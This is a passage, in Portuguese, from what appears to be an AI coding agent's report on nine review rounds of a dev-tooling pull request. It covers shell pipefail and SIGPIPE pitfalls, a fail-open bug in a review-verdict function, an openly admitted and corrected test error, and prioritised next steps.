longo de cinco rodadas. Um caso por sítio não fecha isso. Agora há três regras
que **enumeram**, sobre recipes *e* tools:

1. todo `| tee` está sob `pipefail` (senão o exit do `tee`, que é 0, engole a recusa);
2. nada canaliza para `grep -q`/`head` (consumidor que sai cedo + `pipefail` = 141);
3. toda expansão sem quotes está sob `set -f` (senão *pathname expansion*).

Cada uma com mutante vermelho. O sétimo sítio dessas classes reprova num teste,
não numa rodada de review — e é a única coisa desta sequência que reduz o custo da
próxima.

### Rodadas 8 e 9 — o que elas mudaram na leitura

Depois de a decisão do `type` ser autorizada, o loop seguiu, e vale registrar as
duas últimas porque elas mudam a conclusão, não só a contagem:

- **Rodada 8** — `Spike` não existe na org (`VS402323`); a tool aceitava o tipo e
  produziria 404 → `exit 3` = "re-rode". A skill documentava um tipo fantasma e o
  teste **pinava o comportamento errado como certo**. E uma afirmação minha no
  README era falsa **na direção confortável**: dois runs concorrentes não dão
  "duplicata do mesmo item", dão um run PATCHando a work item do outro — e a
  decisão de não usar id de run se apoiava nessa frase.
- **Rodada 9** — **fail-open na única função que decide.** `_says` era
  `printf | grep -qE`; com review acima de ~395 KB o `printf` morre de SIGPIPE, o
  pipeline vira 141, o `if` fica falso e o **🔴 desaparece** — o veredito sai
  `approved-with-suggestions` e o S05 da `ship.yaml` **vota** com a identidade do
  dev. O gatilho é o caso normal: diff grande → review grande.
  Eu havia varrido essa classe em quatro sítios e deixei de fora a função que
  decide, porque **minha própria regra de completude** procurava `| grep -q`
  literal e o consumidor estava embrulhado numa função.

**E quatro dos meus testes desta rodada estavam errados**, incluindo um controle
negativo que eu **declarei ter rodado e não rodou** (usei `python3 -c "…"` com
`$2` em aspas duplas; o shell interpolou, o replace não casou nada, e a suíte
ficou verde por vacuidade). Os quatro estão corrigidos com o porquê escrito. O
padrão que eles têm em comum — casar **prosa** em vez de código, ou medir a coisa
errada — apareceu quatro vezes nesta leva e é o defeito mais recorrente do meu
próprio trabalho aqui.

**A conclusão honesta, e ela não é sobre o PR:** a taxa de descoberta de defeitos
não caiu ao longo de nove rodadas, e a última encontrou fail-open no juiz. Isso é
evidência de que a superfície está **sub-testada em relação à sua intricação** —
não de que convergiu. O que reduz o custo daqui pra frente são as **seis regras de
completude**, que pegam classes mecanicamente (o `| tee` sem `pipefail`; o pipe
para consumidor que sai cedo, inclusive embrulhado em função; a expansão sem
`set -f`; a opcional passada como vazia; o argumento que escapa do
`require_ref_name`; e as duas tools concordando sobre a lista de tipos).

**Atenuante que importa para a decisão de mergear:** o diff são **46 arquivos, e
nenhum é código de produto** — 38 em `scripts/`, 5 em `.claude/`, 3 em `.corvex/`,
**zero** em `backend/`, `frontend/`, `infra/` ou `lambdas/`. O raio de explosão é
o fluxo de dev, e a falha é **alta e imediata**, não corrupção silenciosa de dado.
As duas exceções — as tools que decidem voto e merge — são justamente as mais
testadas agora.

**Onde eu parei, e por quê:** com dois críticos na mesa da rodada 7. Consertei o
que era barato e seguro (o `set -f`) e **registrei** o que é mudança de contrato:
`json_value` na `az-transition.sh` deduz o tipo JSON da forma do valor, e o plano
não carrega tipo — `Custom.…=0` sai `"value":0` num campo booleano, e o 400 que
volta vira `exit 3` ("re-rode") numa chamada que nunca vai passar. O conserto
certo é um `type` por campo na tabela do `az-transition-plan.sh`, o que **muda o
schema de saída** de uma tool em produção desde a F8. Não é conserto de passagem.

O PR está materialmente melhor do que na rodada 0 — saiu de *"a recipe mergeia PR
bloqueado"* para *"não mergeia"* — e continua com veredito `blocked`, que é o
estado honesto: há um crítico conhecido, com nome, endereço e conserto escrito.

## O que eu faria a seguir, em ordem

**Antes de qualquer coisa:** `cd ~/projects/corvex && go install .` — o binário na sua PATH é de
29/06 e não roda as recipes desta leva. É um comando, e sem ele nada aqui funciona na sua máquina.

1. **`az-edit-workitem.sh`** — é a sexta tool e a que fecha o caso que dói (editar campo de item
   existente). Precisa da mesma sonda `validateOnly` que a de transição usa, então não é conserto de
   passagem: é desenho.
2. **Ratificar (ou reverter) o 🟡 não auto-concluindo**, e medir o `succeededWithIssues` com um PR
   de teste.
3. **Consertar o `pr-review.sh` que engole falha de PR Status** — é o achado mais sério que ficou
   anotado.
4. **Rodar o `gate audit` daqui a algumas semanas.** Ele só vale com população: hoje diz 100 % de
   aprovação sobre n=3, o que não é evidência de teatro nem de rigor. É a única das mitigações do
   roadmap que **melhora sozinha com o tempo**, e a única forma de saber se algum gate virou
   carimbo.
